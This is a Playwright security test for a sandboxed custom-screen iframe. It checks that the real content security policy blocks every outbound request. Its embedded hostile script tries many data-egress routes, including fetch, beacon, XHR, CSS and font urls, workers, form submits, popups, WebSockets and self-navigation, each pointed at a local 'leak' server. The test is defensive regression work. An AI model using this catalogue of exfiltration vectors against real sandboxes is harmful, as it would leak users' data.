import { test, expect } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import type { Socket } from 'node:net';
import { fileURLToPath } from 'node:url';
import { dirname, resolve } from 'node:path';

/**
 * P0 security regression: a sandboxed custom SCREEN can read records via the FormLogic SDK, so it must
 * not be able to make ANY outbound request. This renders a hostile screen with the REAL SCREEN_CSP +
 * the real `sandbox="allow-scripts"` iframe (matching CustomScreenRuntime) and points every known
 * egress vector — fetch/XHR/beacon/WebSocket, image/CSS-url/font/media resource loads, nested iframe/
 * object/worker, form submit, popup, and frame SELF-NAVIGATION — at a real local server. Ground truth:
 * nothing must arrive. (Playwright's `request` event fires even for CSP-blocked attempts, so we assert
 * on actual server ARRIVAL, not request events.)
 */
const __dirname = dirname(fileURLToPath(import.meta.url));
const cspSrc = readFileSync(resolve(__dirname, '../src/components/custom-screen/sdkRuntime.ts'), 'utf8');
const cspMatch = cspSrc.match(/export const SCREEN_CSP\s*=\s*((?:"[^"]*"\s*\+?\s*)+);/);
const SCREEN_CSP = (cspMatch![1].match(/"([^"]*)"/g) || []).map((s) => s.slice(1, -1)).join('');

test('sandboxed custom screen has no working data-egress vector', async ({ page }) => {
  const arrived = new Set<string>();
  const sockets = new Set<Socket>();
  const server: Server = createServer((req, res) => {
    try { arrived.add(new URL(req.url ?? '', 'http://x').searchParams.get('vector') ?? 'form'); } catch { arrived.add('form'); }
    res.end('x');
  });
  // Track/destroy sockets and reject WS upgrades so teardown never blocks on the browser's keep-alive
  // (or half-open WebSocket) connections.
  server.on('connection', (s) => { sockets.add(s); s.on('close', () => sockets.delete(s)); });
  server.on('upgrade', (_req, socket) => socket.destroy());
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  const port = (server.address() as { port: number }).port;
  const EXT = `http://127.0.0.1:${port}/leak`;
  const WS = `ws://127.0.0.1:${port}/leak?vector=ws`;

  const code = `
    var E='${EXT}';
    try{ new Image().src=E+'?vector=img'; }catch(e){}
    try{ fetch(E+'?vector=fetch',{mode:'no-cors'}); }catch(e){}
    try{ navigator.sendBeacon && navigator.sendBeacon(E+'?vector=beacon','x'); }catch(e){}
    try{ var x=new XMLHttpRequest(); x.open('GET',E+'?vector=xhr'); x.send(); }catch(e){}
    try{ var st=document.createElement('style'); st.textContent='div.k{background:url('+E+'?vector=cssurl)}'; document.head.appendChild(st); var d=document.createElement('div'); d.className='k'; document.body.appendChild(d); }catch(e){}
    try{ var fo=document.createElement('style'); fo.textContent='@font-face{font-family:z;src:url('+E+'?vector=font)} p{font-family:z}'; document.head.appendChild(fo); var p=document.createElement('p'); p.textContent='z'; document.body.appendChild(p); }catch(e){}
    try{ var au=document.createElement('audio'); au.src=E+'?vector=media'; document.body.appendChild(au); }catch(e){}
    try{ var fr=document.createElement('iframe'); fr.src=E+'?vector=iframe'; document.body.appendChild(fr); }catch(e){}
    try{ var ob=document.createElement('object'); ob.data=E+'?vector=object'; document.body.appendChild(ob); }catch(e){}
    try{ new Worker(E+'?vector=worker'); }catch(e){}
    try{ var fm=document.createElement('form'); fm.action=E; fm.method='GET'; var i=document.createElement('input'); i.name='vector'; i.value='form'; fm.appendChild(i); document.body.appendChild(fm); fm.submit(); }catch(e){}
    try{ window.open(E+'?vector=popup'); }catch(e){}
    try{ new WebSocket('${WS}'); }catch(e){}
    try{ setTimeout(function(){ try{ location.href=E+'?vector=selfnav'; }catch(e){} }, 500); }catch(e){}
    try{ setTimeout(function(){ try{ location.replace(E+'?vector=selfnav2'); }catch(e){} }, 700); }catch(e){}
  `;
  const srcdoc = `<!doctype html><html><head><meta charset="utf-8">`
    + `<meta http-equiv="Content-Security-Policy" content="${SCREEN_CSP}">`
    + `<style>html,body{margin:0}</style></head><body><script>${code}</script></body></html>`;

  try {
    await page.goto('about:blank');
    await page.evaluate((doc) => {
      const f = document.createElement('iframe');
      f.setAttribute('sandbox', 'allow-scripts');
      (f as HTMLIFrameElement).srcdoc = doc;
      document.body.appendChild(f);
    }, srcdoc);
    await page.waitForTimeout(2500);
  } finally {
    for (const s of sockets) s.destroy();
    server.close();
  }

  expect(Array.from(arrived).sort(), 'no egress vector should reach an external server').toEqual([]);
});
